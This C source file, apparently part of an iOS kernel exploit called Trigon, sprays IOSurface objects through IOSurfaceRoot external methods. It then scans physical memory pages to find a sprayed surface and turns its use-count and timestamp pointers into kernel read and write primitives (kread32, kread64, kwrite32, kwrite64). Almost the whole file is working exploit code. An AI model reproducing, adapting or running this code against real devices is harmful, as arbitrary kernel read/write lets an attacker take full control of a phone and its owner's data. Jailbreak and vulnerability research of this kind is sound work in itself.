// surface.c
// Trigon, 2025

#include "surface.h"
#include "info.h"
#include "pv.h"
#include "memory.h"

#include <mach/mach.h>
#include <IOSurface/IOSurfaceRef.h>
#include <CoreFoundation/CoreFoundation.h>

extern const mach_port_t kIOMasterPortDefault;
extern io_service_t IOServiceGetMatchingService(mach_port_t, CFDictionaryRef);
extern CFMutableDictionaryRef IOServiceMatching(const char *);
extern kern_return_t IOServiceOpen(io_service_t, task_port_t, uint32_t, io_connect_t *);
extern kern_return_t IOConnectCallMethod(mach_port_t, uint32_t, uint64_t *, uint32_t, void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
extern kern_return_t IOServiceClose(io_connect_t);
extern kern_return_t IOObjectRelease(io_object_t);

#define IOSURFACE_SPRAY_COUNT (5000)

typedef struct {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
} fast_create_args_t;

typedef struct {
    uint64_t isa;
    uint8_t pad0[0xc];
    uint32_t read_displacement;
    uint32_t surface_id;
    uint8_t pad1[0x50];
    uint64_t receiver;
    uint8_t pad2[0x2c];
    uint32_t pixel_format;
    uint8_t pad3[0x4];
    uint32_t alloc_size;
    uint8_t pad4[0x10];
    uint64_t use_count;
    uint8_t pad5[0x298];
    uint64_t indexed_timestamp;
    uint8_t pad6[0xbf8];
} lock_result_t;

IOSurfaceRef create_purplegfxmem_iosurface(void) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);

    int val = (int) 'ARGB'; // LE
    CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), CFNumberCreate(NULL, kCFNumberSInt32Type, &val));

    val = 200;
    CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), CFNumberCreate(NULL, kCFNumberSInt32Type, &val));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBufferTileMode"), kCFBooleanFalse);

    val = 800;
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerRow"), CFNumberCreate(NULL, kCFNumberSInt32Type, &val));

    val = 4;
    CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerElement"), CFNumberCreate(NULL, kCFNumberSInt32Type, &val));

    val = 0x30000;
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNumberCreate(NULL, kCFNumberSInt32Type, &val));

    val = 200;
    CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), CFNumberCreate(NULL, kCFNumberSInt32Type, &val));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));

    return IOSurfaceCreate(dict);
}

void iosurface_spray(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
    if (*nClients >= 0x4000) return;
    for (int i = 0; i < nSurfaces; i++) {
        fast_create_args_t args;
        lock_result_t result;
        bzero(&args, sizeof(fast_create_args_t));
        bzero(&result, sizeof(lock_result_t));
        
        size_t size = gDeviceInfo.major == 13 ? 0xDD0 : 0xF60;
        args.address = 0;
        args.alloc_size = *nClients + 1;
        args.pixel_format = IOSURFACE_MAGIC;
        
        IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
        io_connect_t id = result.surface_id;
        
        (*clients)[*nClients] = id;
        *nClients = (*nClients) += 1;
    }
}

uint32_t iosurface_get_pixel_format(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->pixel_format;
}

uint32_t iosurface_get_alloc_size(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->alloc_size;
}

uint64_t iosurface_get_receiver(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->receiver;
}

uint64_t iosurface_get_indexed_timestamp_pointer(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->indexed_timestamp;
}

uint64_t iosurface_get_use_count_pointer(uint64_t uaddr) {
    lock_result_t *result = (lock_result_t *)uaddr;
    return result->use_count;
}

void iosurface_set_indexed_timestamp_pointer(uint64_t uaddr, uint64_t value) {
    lock_result_t *result = (lock_result_t *)uaddr;
    result->indexed_timestamp = value;
}

void iosurface_set_use_count_pointer(uint64_t uaddr, uint64_t value) {
    lock_result_t *result = (lock_result_t *)uaddr;
    result->use_count = value;
}

// MARK: IOSurface methods
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
    uint64_t args[3] = {surfaceID, 0, value};
    IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
    uint64_t args[1] = {surfaceID};
    uint32_t size = 1;
    uint64_t out = 0;
    IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
    return (uint32_t)out;
}

// MARK: IOSurface read/write primitives
static io_connect_t gSurfaceID = 0, gClient = 0;
static uint64_t gSurfaceAddress = 0;

uint32_t kread32(uint64_t addr) {
    uint64_t orig = iosurface_get_use_count_pointer(gSurfaceAddress);
    iosurface_set_use_count_pointer(gSurfaceAddress, addr - 0x14);
    uint32_t value = get_use_count(gClient, gSurfaceID);
    iosurface_set_use_count_pointer(gSurfaceAddress, orig);
    return value;
}

uint64_t kread64(uint64_t addr) {
    uint32_t low = kread32(addr);
    uint32_t high = kread32(addr + 4);
    return (((uint64_t)high << 32) | (uint64_t)low);
}

void kwrite64(uint64_t addr, uint64_t value) {
    uint64_t orig = iosurface_get_indexed_timestamp_pointer(gSurfaceAddress);
    iosurface_set_indexed_timestamp_pointer(gSurfaceAddress, addr);
    set_indexed_timestamp(gClient, gSurfaceID, value);
    iosurface_set_indexed_timestamp_pointer(gSurfaceAddress, orig);
}

void kwrite32(uint64_t addr, uint32_t value) {
    uint64_t current = kread64(addr);
    current &= 0xffffffff00000000;
    current |= (uint64_t)value;
    kwrite64(addr, current);
}

void iosurface_release(io_connect_t client, uint32_t surface) {
    uint64_t id = (uint64_t)surface;
    IOConnectCallMethod(client, 1, &id, 1, 0, 0, 0, 0, 0, 0);
}

int iosurface_krw_init(uint64_t *task) {
    io_connect_t rootService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    IOServiceOpen(rootService, mach_task_self(), 0, &gClient);
    if (!gClient) return 1;
    uint64_t start = gDeviceInfo.gPhysBase;
    uint64_t length = gDeviceInfo.gPhysSize;
    uint64_t end = start + length;
    
    int nClients = 0;
    io_connect_t *surfaceClients = malloc(IOSURFACE_SPRAY_COUNT * sizeof(io_connect_t));
    iosurface_spray(gClient, IOSURFACE_SPRAY_COUNT, &surfaceClients, &nClients);
    
    int r = 2;
    for (uint64_t curPage = (start + (length / 2)) & ~0x3FFF; curPage <= end; curPage += pages(4)) {
        uint64_t pv_h = pai_get_pvh(pa_index(curPage));
        if (!pv_h) continue;

        if (!pvh_test_type(pv_h, PVH_TYPE_PTEP)) continue;
        
        uint64_t flags = pvh_get_flags(pv_h);
        if (flags & PVH_FLAG_EXEC) continue;
        if (flags & PVH_FLAG_LOCKDOWN) continue;
        
        uint64_t addr = map_page(curPage, VM_PROT_DEFAULT);
        if (iosurface_get_pixel_format((uint64_t)addr) == IOSURFACE_MAGIC) {
            gSurfaceID = surfaceClients[iosurface_get_alloc_size(addr) - 1];
            gSurfaceAddress = addr;
            if (task) *task = iosurface_get_receiver(addr);
            r = 0;
            goto out;
        }
        unmap_page(addr);
    }
    
    out:
    for (int i = 0; i < IOSURFACE_SPRAY_COUNT; i++) {
        if (surfaceClients[i] && surfaceClients[i] != gSurfaceID) iosurface_release(gClient, surfaceClients[i]);
    }
    free(surfaceClients);

    return r;
}

void iosurface_krw_deinit(void) {
    if (gSurfaceID) iosurface_release(gClient, gSurfaceID);
    if (gSurfaceAddress) unmap_page(gSurfaceAddress);
    if (gClient) IOServiceClose(gClient);
}
